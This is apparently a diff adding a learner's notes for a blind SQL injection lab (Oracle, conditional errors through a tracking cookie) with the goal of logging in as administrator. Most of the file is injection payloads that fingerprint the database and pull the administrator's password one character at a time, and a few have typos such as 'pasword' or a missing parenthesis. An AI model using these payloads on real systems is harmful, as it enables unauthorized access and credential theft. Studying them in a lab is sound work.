@@ -1,0 +1,37 @@
+Tracking cookies are used for analytics
+Performs a SQL query with submitted cookie
+
+
+
+Results of SQL query aren't returned; application doesn't respond differently
+
+If error is caused, the you will see a custom error message indicating there is a vulnerability
+
+Table called users
+Columns = username;
+          password;
+
+Login as the adminstrator user
+
+Personal Goals --- Outline of potential steps
+1) Find out the type of database that is being used
+2) 
+
+' || (select '' from dual) || '
+
+' || (select '' from duallaskjdfkjds) || '
+
+' || (select '' from users where rownum=1) || '
+
+' || (select '' from users where username='administrator') || '
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual || '
+
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE user='administrator' and substr(pasword,1,1) = 'a') ||'
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE user='administrator' and substr(pasword,1,1) = 'a') ||'
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1) = 'a') || '
